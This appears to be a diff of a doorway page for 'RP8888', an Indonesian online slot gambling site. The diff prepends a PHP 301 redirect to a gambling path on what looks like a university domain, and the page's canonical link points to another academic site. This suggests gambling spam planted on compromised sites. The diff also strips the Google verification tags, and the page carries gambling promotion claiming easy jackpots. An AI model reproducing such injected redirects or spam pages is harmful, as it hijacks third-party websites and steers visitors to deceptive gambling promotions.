@@ -1,3 +1,7 @@
+<?php
+//* Permanently redirect page
+header("Location: https://timesrnd.taylors.edu.my/slot-thailand/",TRUE,301);
+?>
 <!DOCTYPE HTML>
 <html xmlns:wormhole="http://www.w3.org/1999/xhtml" lang="id-ID">
 <head>
@@ -5,7 +9,6 @@
   <title>RP8888 🏦 Daftar Disini Situs Deposit Slot 10000 Via Qris 5 Detik</title>
   <meta name="description" content="RP8888 memang situs game slot qris paling top cukup deposit 10000 langsung diproses tercepat cukup 5 detik, tingkat probabilitas hadiah paling gampang maxwin hari ini." />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
-  <meta name="google-site-verification" content="SF7Ny8jFi_kLabHMgZ6WJf4n7TFzOStYsBOmR3Cafp4" />
   <meta name="aplus-auto-exp" content='[{"filter":"exp-tracking=suggest-official-store","logkey":"/lzdse.result.os_impr","props":["href"],"tag":"a"}]' />
   <meta name="data-spm" content="a2o4j" />
   <meta name="robots" content="index, follow" />
@@ -14,8 +17,6 @@
   <meta name="og:type" content="product" />
   <meta name="og:description" content="RP8888 memang situs game slot qris paling top cukup deposit 10000 langsung diproses tercepat cukup 5 detik, tingkat probabilitas hadiah paling gampang maxwin hari ini." />
   <meta name="og:image" content="https://images.squarespace-cdn.com/content/v1/66ac8f6b62ce4127c3a2debb/7f588583-2bc9-4780-8b24-658d1c3e7979/RP8888+Slot+Qris.png" />
-  <meta name="page google.com" content="https://www.google.com/search?q=rp8888">
-<meta name="page google.co.id" content="https://www.google.co.id/search?q=rp8888">
   <link rel="manifest" href="https://g.lazcdn.com/g/lzdfe/pwa-assets/5.0.7/manifest/id.json">
   <link rel="shortcut icon" href="https://images.squarespace-cdn.com/content/v1/66af1b77d73c095db91c1a30/a49d768e-00bf-4f43-9fad-21939c67377f/favicon.ico" />
   <link rel="canonical" href="https://hicas.ac.in/js/rp888/" />
